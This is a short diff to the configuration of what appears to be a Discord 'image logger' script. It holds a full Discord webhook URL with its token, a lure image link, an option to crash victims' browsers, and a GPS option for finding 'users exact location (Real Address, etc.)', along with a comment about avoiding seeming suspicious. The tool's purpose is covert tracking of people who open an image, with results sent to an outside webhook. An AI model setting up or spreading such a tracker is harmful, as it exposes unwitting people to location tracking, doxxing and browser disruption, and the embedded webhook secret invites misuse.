@@ -14,7 +14,7 @@ __author__ = "Hypix"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1384523887043280906/N9tLcqr5nV0tzMLYOWDLSvyjtXLSGE0f6sWgLV9GjXLEvEquF8ASpqX8mKrY5F9UsT0m",
-    "image": "https://www.shutterstock.com/image-photo/bill-torn-revealing-words-you-260nw-1734671219.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://stock.adobe.com/search?k=jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -25,7 +25,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
